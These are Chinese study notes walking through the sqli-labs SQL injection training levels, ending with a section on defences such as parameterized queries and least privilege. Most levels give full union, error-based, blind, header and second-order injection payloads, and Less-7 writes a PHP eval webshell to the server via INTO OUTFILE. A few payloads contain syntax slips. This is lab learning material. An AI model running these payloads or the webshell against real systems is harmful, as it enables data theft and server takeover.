# Less-1 联合注入

## 1.判断字符型还是数字型注入

id=1 回显正常

/?id=1 and 1=1 --+   回显正常

/?id=1 and 1=2 --+  正常

/?id=1' and 1=1 --+ 正常

/?id=1’ and 1=2 --+  错误 说明是字符型注入

id=1'![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-02-09-13-47-36-image.png)

判断字段数

/?id=1' order by 4 --+   回显错误

/?id=1' order by 3 --+   回显正常

## 2.判断数据库类型

​ mysql：`id=1' AND updatexml(1,concat(0x7e,version()),1) --+` 显示数据库类型则为mysql

数据库版本在5.0大版本以上，说明可以利用`information_schema`系统库，数据库名是security

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-02-09-13-57-03-image.png)

​ oracle:` id=1' AND 1=ctxsys.drithsx.sn(1,(SELECT banner FROM v$version WHERE rownum=1)) --+` 反应ORA-错误含版本信息则为oracle数据库

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-02-09-13-56-48-image.png)

​ sqlserver:` id=1' AND 1=convert(int,@@version) --+`转换失败含版本信息则为sqlserver
![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-02-09-13-57-22-image.png)

## 3.使用联合查询union select 判断回显位置

`id=1’ union select 1,2,3 --+ `(没有反应，因为id=1执行了，后面的不会覆盖)

`​id=-1’ union select 1,2,3 --+`（id=-1,让前面的不执行）

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-02-09-14-01-25-image.png)

## 4.查询数据库名

`-1' union select 1,database(),3 --+` （回显security）

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-02-09-14-02-09-image.png)

## 5.查询表名 table

​ 第一种：group_concat（不太建议，有可能查不全，有坑）

​ `-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='数据库' --+`

​ 解释一下：group_concat(table_name)放在显示位上查询表名，可以直接写table_name，但有时候会只显示一个。from infonmation_schema.tables从记录表名的数据库中查找。where table_scema='syguestbook’查找一个数据库名叫syguestbook的数据库中的信息

​ 第二种：table_name（一个一个查，慢但全）

`-1' ​union select 1,2,table_name from information_schema.tables where table_schema='数据库' limit 1,1 --+`

​ 解释一下：table_name位数从0开始，更改时更改第一个数字（例如：limit 0,1；limit 1,1；limit 2,1）
![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-02-09-21-12-47-image.png)

## 6.查询字段名 column（和表名差不多）

​ 第一种：group_concat

`-1'​ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='数据库' and table_name='表名' --+`

​ 第二种：table_name（一个一个查，慢但全）

`-1' union select 1,2,column_name from information_schema.columns where table_schema='数据库' and table_name='表名' limit 0,1 --+`

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-02-09-21-15-54-image.png)

## 7.查询数据

第一种：group_concat

union select 1,2,group_concat(字段1，字段2，字段3....) from 表名 -- q ，0x7e 作为分隔符“~”避免数据粘连：字段1，0x7e，字段2

​ 第二种：table_name（一个一个查，慢但全）

​ union select 字段名 from 数据库.表名 limit 0,1

`http://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,2,group_concat(id,username,password) from users--+`

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-02-09-21-22-56-image.png)

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-02-09-21-23-23-image.png)

## 联合注入的机制：

联合注入利用 `UNION` 操作符将两个 `SELECT` 语句的结果合并返回。例如：

`SELECT * FROM users WHERE id='$id' UNION SELECT 1,2,3--+`

当 `$id` 为 `1'` 时，原始查询可能返回一行真实数据，此时整个结果集会包含原始数据和 union 查询的数据。但网页通常只显示结果集中的**第一条记录**（或按某种逻辑只显示部分数据），导致我们注入的数据被隐藏，无法看到。

将 `id` 改为一个**不存在的值**（如 `-1`、`0` 或一个很大的数），可以确保原始查询**返回空结果**。此时整个结果集只有 union 查询的数据，页面便会显示这些注入的内容。例如：

`SELECT * FROM users WHERE id='-1' UNION SELECT 1,2,3--+`

由于 `id = -1` 在表中不存在，原始查询返回 0 行，最终输出只有 union 查询的 `1,2,3`。

# Less-2

数字型注入 id=1，其他的步骤一样

# Less-3

和第一关的区别是：是以单引号和括号闭合的形式（字符型） `id=1')`

# Less-4

和第一关的区别是：是以双引号和括号闭合的形式（字符型） `id=1")`

# Less-5 报错注入

## 1.判断注入类型

id=1 AND 1=1 --+ 正常

id=1 AND 1=2 --+ 正常

id=1' AND 1=1 --+ 正常

id=1' AND 1=2 --+ 错误

说明是字符型注入

## 2.判断字段数

id=1' order by 3--+ 正常

id=1' order by 4--+ 错误

id=1‘  union select 1,2,3 --+

## 3.使用联合查询union select 判断回显位置

id=1’ union select 1,2,3 --+ (没有反应，因为id=1执行了，后面的不会覆盖)

​ id=-1’ union select 1,2,3 --+ （id=-1,让前面的不执行）

没有回显可以想到用盲注（一般可以先尝试报错注入——updatexml）

updatexml语法：updatexml（目标xml内容，xml文档路径，更新内容）

例子语句：

```sql
and updatexml(1,concat（0x7e,(SELECT @@version),0x7e),1)

介绍：updatexml（1，xml文档路径，1）一般只需要改第二个

在SQL报错注入中，updatexml()函数用于处理XML数据，其第二个参数是XPath表达式。
如果XPath格式错误，MySQL会抛出错误并显示该表达式的内容。攻击者正是利用这一点，将恶意
查询（如select @@version）嵌入到XPath参数中，通过错误信息获取数据。

concat(0x7e,(select @@version),0x7e)的作用是在查询结果前后各添加一个
波浪号~（十六进制0x7e）。波浪号不是合法的XPath起始字符，因此会导致XPath语法错误，
触发报错。同时，错误信息会包含整个参数，即~数据库版本~，从而将查询结果泄露出来。
如果不加这两个波浪号，直接传入版本号（如5.7.33）可能不会引发XPath错误，或者错误信息
不完整，无法可靠地获取数据。因此，0x7e起到了触发报错并确保数据被完整显示的关键作用。
```

## 4.查询数据库名（盲注——报错注入）

```sql
and updatexml(1,concat(0x7e,(select database()),0x7e),1) -- +
```

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-02-22-44-46-image.png)

## 5.查询表名（盲注——报错注入)

`and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x7e),1) -- +`

​ 注意报错一般有长度限制，不能输出太长的数据，尽量不要使用group_concat()

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-02-22-49-57-image.png)

改变`limit 1,1`

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-02-22-55-32-image.png)

改变`limit 3,1`

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-02-22-56-05-image.png)

## 6.查询字段名（盲注——报错注入)

​ 注意报错一般有长度限制，不能输出太长的数据，尽量不要使用group_concat()

`?id=-1' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),0x7e),1) -- q`

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-02-22-59-45-image.png)

`limit 1,1`

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-02-23-01-03-image.png)

`limit 2,1`

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-02-23-01-33-image.png)

3,1是空的，所以只有列`id,username,password`

## 7.查询数据（盲注——报错注入)

`?id=-1' and updatexml(1,concat(0x7e,(select group_concat(id,'~',username,'~',password) from users ),0x7e),1) -- q`

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-02-23-09-08-image.png)

# Less-6

XPATH syntax error: '~id~'

XPATH syntax error: '~email_id~'

# Less-7 写入注入

GET-写入注入

## 1.判断注入类型（有无注入点）

是以 ')) 闭合的

## 2.判断字段数

​ id=1’ order by 4 --+ 反应错误 id=1’ order by 3 --+反应正确 （字段数为3）

## 3.​利用写权限拿下服务器

因为报错注入（盲注没有用），但是有outfile想到可以用outfile向服务器写入文件

写马：在利用sql注入漏洞后期，最常用就是通过mysql的file系列函数来读取敏感文件或者写入webshell，其中比较常用的函数有以下三个

​ into dumpfile()

​ into outfile()

​ load_file()

​ 前提：这些都需要设置secure_file_priv ，如果为空则可以指定任意目录，如果有设置等于某个路径就只能在这个指定路径下，而他为null值则禁止导入导出功能

> `id=1')) UNION SELECT 1, '<?php @eval($_REQUEST[1]); ?>', 3 INTO OUTFILE 'C:\tools\phpstydy\PHPTutorial\WWW\sqli-labs-master\Less-7\111.php' --+
> 
> 解释：''一句话木马
> INTO OUTFILE 'C:\tools\phpstydy\PHPTutorial\WWW\sqli-labs-master\Less-7\webshell.php' 找到被攻击服务器的路径`

## 4.写入命令执行

Less-7/111.php?1=phpinfo();

解释：在创建的111.php中用1来接；

## 5.用webshell工具连接被攻击服务器

# Less-8 布尔盲注

### GET-布尔盲注

盲注——<u>正确和错误有两种不同的返回页面</u>——优先选择布尔盲注

length()函数，返回字符串长度

`substr() 截取字符串长度 （语法：substr(str,pos,len)`

ascii() 返回字符asccii码

## 1.判断注入类型

?id=1 and 1=1 --+ 正常

?id=1 and 1=2 --+ 正常 说明不是数字型注入

?id=1' and 1=1 --+ 正常

?id=1' and 1=2 --+ 错误 说明是字符型注入

## 2.判断字段数

`?id=1' order by 3 --+` 正常

`?id=1' order by 4 --+` 错误

字段数为3

## 3.查询数据库长度

`?id=1' and length(database())>2  --+` 返回正常，说明数据库名长度大于2

`?id=1' and length(database())>10 --+` 返回错误，说明数据库名长度小于10

以此类推，得到库名长度为8

## 4.查询数据库名

`?id=1' and ascii(substr((database(),1,1))>100 --+ `正常，说明表名第一个字母的ascii码大于100，按照二分法定位出表名第一个字母的ascii码为115，查表发现是字母s

以此类推:`?id=1' and ascii(substr((database(),2,1))>100 --+`，定位出表名第二个字母为e

最后查询八个字母，得到表名为’security‘

## 5.查询表名

`?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))>100 --+`    二分法查询表名的第一个字母

`limit 0,1`表示查的是第一个表名，`limit 0,1),1,1)`表示查的是第一个表名的第一个字母

`limit 1,1`表示查的是第二个表名，`limit 1,1),1,1)`表示查的是第二个表名的第一个字母

> 解释：把database()数据库名换成(select table_name from information_schema.tables where table_schema='数据库' limit 0,1) 来查询表名
> 注意：这时候(select table_name from information_schema.tables where table_schema='数据库' limit 0,1)里面的数字不用改，改外面截取的

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-04-17-47-34-image.png)

第一个字母ascii码为101，为字母e

以此类推查到

第一个表名为emails

第二个表名为referers

## 6.查询列名

`?id=1' and (ascii(substr((select column_name from information_schema.columns where table_schema='security'  and table_name='表名' limit 0,1),1,1)))>100 --+ `   true

## 6.查询数据

`?id=1' and (ascii(substr((select 字段名 from 数据库.表名 limit 0,1),1,1)))>100 --+` true

# Less-9  时间盲注

## GET-时间盲注

盲注——正确和错误同样的返回页面——时间盲注

因为时间盲注不加时间条件看不出来。

if(条件,sleep(5),1) 正确延迟5秒，错误不延迟

## 1.判断字段（时间盲注——在bp中判断）

`?id=1 and if(1=1,sleep(5),1) --+`   网页无反应

`?id=1' and if(1=1,sleep(5),1) --+`  网页停止了五秒钟加载完成，说明是字符型注入

## 2.判断数据库名长度

`?id=1' and if(length(database())=8,sleep(5),1)--+`  有效果，说明数据库名长度为8

## 3.利用Asccii猜解数据库名称 (ascii函数+substr函数) + 二分法

`?id=1' and if(ascii(substr(database(),1,1))=115,sleep(5),1)--+`

## 4.利用Asccii猜解表名称 (ascii函数+substr函数) + 二分法

`?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='数据库名' limit 0,1),1,1))=101,sleep(5),1)--+`

## 5.利用Asccii猜解字段名称 (ascii函数+substr函数) + 二分法

`?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_schema='数据库名' and table_name='表名' limit 0,1),1,1))=101,sleep(5),1)--+`

## 6.利用Asccii猜解字段中具体数据 (ascii函数+substr函数) + 二分法

`?id=1' and if(ascii(substr((select 字段名 from 数据库名.表名 limit 0,1),1,1))=101,sleep(5),1)--+`

# Less-10

以id=1"闭合的时间盲注

# Less-11

在输入框中进行测试,主要在用户名上注入，密码随便填

## 1.判断注入点（万能语句）

```
' or 1=1 -- q 
解释：’代表闭合，or 1=1 用于让语句一定执行
```

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-05-19-24-18-image.png)

## 2.判断字段数

`' order by 3 --+`

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-05-19-24-51-image.png)

`' order by 2 --+`

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-05-19-26-10-image.png)

## 3.判断显错位

`' union select 1,2 --+`

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-05-19-26-47-image.png)

## 4.判断库名

`' union select 1,database() --+`

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-05-19-27-53-image.png)

## 5.查询表名

`' union select 1,group_concat(table_name) from information_schema.tables where table_schema='security' --+`

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-05-19-31-45-image.png)

## 6.查询字段名

`' union select 1,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'`

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-05-19-47-41-image.png)

## 7.获取数据

`' union select 1,group_concat(id,username,password) from users  --+`

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-05-19-49-12-image.png)

# Less-12

以`')`闭合

# Less-13

报错注入

## 1.判断注入点

`')`  闭合

`') and 1=1 --+` 返回正常

## 2.判断字段数

`') order by 2--+`

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-05-20-17-01-image.png)

## 3.判断数据库名

`') and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+`

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-05-20-19-52-image.png)

## 4.查询表名

`') and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x7e),1) --+`

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-05-20-21-25-image.png)

查到`limit 3,1)`发现有users

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-05-20-26-45-image.png)

## 5.查询字段名

`') and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),0x7e),1) --+`

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-05-20-22-37-image.png)

还有username password

## 6.获取数据

`') and updatexml(1,concat(0x7e,(select group_concat(id,username,password) from security.users),0x7e),1) --+`

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-05-20-30-53-image.png)

这里`select`后面建议用`group_concat`将`id,username,password`拼接在一起，不然就只能一个一个查询

# Less-14

以“闭合 

# Less-15

## post注入—时间盲注

原理：

![](https://i-blog.csdnimg.cn/blog_migrate/27d74e8af607a21af3a8c24f0eacf624.png)

## 1、判断注入点

输入正常的数据，没有任何回显

加入单引号、双引号、括号等，都没有任何回显信息，这里可以判断为时间盲注

输入  `admin' and if(length(database())>1,sleep(5),1) --+`

会延时5秒钟（我的电脑这里必须是`'`前面必须是admin才能成功）

## 2.判断数据库长度

使用函数if()，length()、sleep()、substr()、ascii()

`admin' and if(length(database())=8,sleep(5),1)#`

成功说明数据库名长度为8

## 3.查询数据库名

`admin' and ascii(substr(database(),1,1))>110,sleep(5),1)--+`

以此类推

## 4.查询表名

`admin' and ascii(substr(select table_name from information_schema.tables from table_schema='security',1,1))>110,sleep(5),1) --+`

以此类推

## 5.查询列名

`admin' and if(ascii(substr((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),1,1))=105,sleep(5),1)--+`

## 6.查询数据

`admin' and if(ascii(substr(select group_concat(字段名1,字段名2,...) from 数据库名.表名 limit 0,1),1,1 ))>110,sleep(5),1) --+`

以此类推，可以得到数据库的数据

# Less-16

以`")`闭合

# Less-17

这里要对账号进行一个爆破

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-09-15-22-51-image.png)

发现账号是admin

在密码输入框中注入

尝试万能密码`' or 1=1 --+`

判断字段数`' order by 3 --+ `显示错误

`' order by 2 --+` 显示正确

尝试联合注入`' union select 1,2 --+` 错误

尝试报错注入` ' and updatexml(1,concat(0x7e,(select @@version),0x7e),1) --+`

# Less-18  请求头注入

请求头注入

    刚打开页面显示自己本机的ip地址——记录了我们的信息——应该于数据库有联系——可能有SQL注入
    记录了我们登录的信息（例如浏览器信息，ip信息）——想到数据包中的请求头暴露的——想到头注入

常见的请求头：

    User_Agent 浏览器的身份标识字符串
    Referer 表示浏览器所访问的前一个页面，也可以认为是之前访问页面的链接将浏览器带到了当前页面
    Accept 可接受响应内容类型（Content-Types)
    X-Forwarded-For 可以用来表示HTTP请求端真实ip
    Date 发送该消息的日期和时间

User_Agent注入
————————————————
版权声明：本文为CSDN博主「shengjie520」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/2401_87551095/article/details/147402097

在UA处进行报错注入`' and updatexml(1,concat(0x7e,(select database(),0x7e),1) --+`

# Less-19

这里对referer进行注入

# Less-20

对cookie进行注入

# 高级注入

# Less-23 （过滤注释符）

提醒：这题过滤了#和--注释符

如果 # 和 -- 都被过滤，可以尝试：

    用 ;%00（空字节截断）（建议在mysql中）
        例如：id=1' AND 1=1;%00
        %00 是 NULL 字符，可能提前终止 SQL 语句。
        %00代表NUL用于阻止后续的安全检查
    用 /*注释*/（多行注释）
        例如：id=1' AND 1=1 /*注释*/
    
    闭合引号 + 逻辑判断
        例如：id=1' OR '1'='1'（无需注释符）。

# Less-24（二次注入）

## 二次注入

二次注入是存储型注入，可以理解为构造恶意数据存储在数据库后，恶意数据被读取并进入到了SQL查询语句所导致的注入。

当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。简言之就是将脏数据进行简单过滤后开发者就认为该数据可信便存入数据库中，当下一次调用该数据时，该数据就会拼接到其他查询语句中造成注入。

查看源码：

```php
$username= $_SESSION["username"];
$curr_pass= mysqli_real_escape_string($con1, $_POST['current_password']);
$pass= mysqli_real_escape_string($con1, $_POST['password']);
$re_pass= mysqli_real_escape_string($con1, $_POST['re_password']);    

if($pass==$re_pass)
{    
    $sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";
```

这里过滤了password

username没有被过滤，这个username是登录成功后存储在服务器的SESSION中的，符合二次注入的条件

注册一个账号admin'#        密码123456

登录该账号后，更改该账户的密码为12345

此时执行的SQL语句为：

```sql
UPDATE users SET PASSWORD='12345' where username='admin'#' and password='123456'
```

#吧后面密码都注释了，然后进去之后修改密码为qqq

如此一来实际更改的是用户admin的密码，现在登录admin密码12345发现登录成功。利用这个漏洞可以更改其他用户（如管理员）的密码，以此登录后台。

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-10-20-39-45-image.png)

# Less-25 绕过and和or

发现and和or大小写都被过滤

**逻辑替换**

首先可以用逻辑运算符替换and和or,（&&和||）

但是注意`&&`代表多个传参，由于apache解析的问题&&要换成经url编码后的<u>`%26%26`</u>

**双写绕过**

对于语句来讲不能用逻辑运算符来替换，所以要双写绕过（其实不用逻辑替换直接用双写就行）

接下来用<u>联合注入</u> 或 <u>报错注入</u>都可以（注意双写）

`?id=-1' union select 1,2,database() --+`（要是-1，我总是忘记）

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-10-21-15-32-image.png)

`?id=1' aAndnd updatexml(1,concat(0x7e,(select database()),0x7e),1) -- +`

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-10-21-17-30-image.png)

# Less-26 空格过滤

**空格替换**

    方法1：用%0a或者%0d

    方法2：用括号包围

    方法3：用/**/替代

`?id=1' aandnd (updatexml(1,concat(0x7e,(select(database()),0x7e),1)) aandnd '1'='1`

``?id=1' aandnd (updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema)='security'),0x7e),1)) aandnd '1'='1`

![](C:\Users\戴建\AppData\Roaming\marktext\images\2026-03-11-22-54-25-image.png)

# Less-27 union，select关键字过滤

这题查看源码发现过滤了空格，注释符，union、select

union、select这种查询单词，一般是黑名单过滤（可以在这里面插入大小写过滤）

例如：

```sql
select -- selECt
union -- unIOn
```





# 防御sql注入的方法

SQL 注入（SQL Injection）本质是：**攻击者把恶意 SQL 代码混入用户输入，让数据库执行本不应该执行的语句。**  
所以所有防御方法的核心只有一句话：

> **让用户输入永远只是“数据”，而不是“SQL 代码”。**



## 一、参数化查询（Prepared Statement）

对于普通的sql查询语句采用直接拼接的方法

```php
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id = $id";
```

如果用户正常输入：

`?id=1`

SQL变成：

`SELECT * FROM users WHERE id = 1`

如果输入`?id=1 or 1=1`

SQL变成：

`SELECT * FROM users WHERE id = 1 or 1 = 1`

`1=1` 永远为真，于是：

**整个表的数据都被查出来了**

这就是典型 **SQL注入**。



但是通过参数化查询，可以有效避免这种情况的发生



### 核心思想：

参数化查询就是将sql分隔开

1️⃣ **SQL模板（结构）**

`SELECT * FROM users WHERE id = ?`

2️⃣ **参数数据**

`1`

数据库会先 **编译SQL结构**，再把参数 **当数据填进去**。

例如经典的参数化查询代码

```php
$pdo = new PDO($dsn, $user, $pass);
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id AND name = :name");

$stmt->execute([
 ':id' => $_GET['id'],
 ':name' => $_GET['name']
]);

$results = $stmt->fetchAll();
```

执行流程是这样的：

#### 第一步：创建 SQL 模板

`$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id AND name = :name");`

这里 **`:id` 和 `:name` 是占位符**。

SQL模板：

SELECT * FROM users WHERE id = :id AND name = :name

数据库此时：

- 只解析SQL结构

- **不会执行**

#### 第二步：绑定参数

```php
$stmt->execute([  
    ':id' => $_GET['id'],  
    ':name' => $_GET['name']  
]);
```

假设用户输入：

`?id=1&name=admin`

数据库会执行：

`:id   → 1  
:name → admin`

最终逻辑：

```php
SELECT * FROM users WHERE id = 1 AND name = 'admin'
```



#### 如果攻击者输入：

`?id=1 OR 1=1`

数据库会认为：

`:id = "1 OR 1=1"`

最终SQL逻辑变成：

`SELECT * FROM users WHERE id = "1 OR 1=1"`

注意：

`"1 OR 1=1"`

只是字符串，不是SQL代码，用户输入的变成了字符串的类型之后，再拼接到sql语句结构中，因此参数化查询能很好的避免sql注入。





## 二、严格的输入验证与白名单

原则：

> **只允许合法输入**



### 示例：ID只能是数字

```php
$id = $_GET['id'];

if(!is_numeric($id)){  
 die("invalid id");  
}

```

```python
if not id.isdigit():  
 return "error"
```

### 白名单验证（推荐）

只允许特定格式。

例如用户名：

^[a-zA-Z0-9_]{3,16}$



## 三、使用 ORM 框架

ORM = Object Relational Mapping

例如：

- MyBatis

- Hibernate

- Django ORM

- SQLAlchemy

ORM 默认使用 **参数化查询**。











## 四、数据库权限控制

遵循原则：

> **最小权限原则（Least Privilege）**

应用账号 **不要用 root**。

---

#### 错误配置

`root / root`

权限：

`ALL PRIVILEGES`

攻击者注入后可以：

`DROP TABLE  `
FILE写shell  
`LOAD_FILE`

---

#### 正确配置

创建低权限账号：

`CREATE USER 'app'@'%' IDENTIFIED BY 'password';`

只给查询权限：

`GRANT SELECT, INSERT, UPDATE ON mydb.* TO 'app'@'%';`

攻击者即使注入成功：

也无法

> 写文件  
> 创建表  
> 删除数据库



## 五、关闭危险数据库功能

很多 SQL 注入可以 **直接 getshell**。

例如 MySQL：

危险函数：

LOAD_FILE()  
INTO OUTFILE

---

#### 防御方法

修改配置：

secure_file_priv

限制文件读写目录。



## 六、错误信息隐藏

错误信息可能泄露：

`SQL syntax error near '1''`

攻击者可以推断 SQL 结构。

---

### 错误示例

`You have an error in your SQL syntax`

---

### 正确做法

返回：

`Server Error`

错误写入日志。





## 七、WAF（Web Application Firewall）

例如：

- ModSecurity

- Cloudflare WAF

- 阿里云WAF

可以拦截：

```
union select  
sleep(5)  
benchmark
```

但：

> WAF 只是补充，不是核心防御。
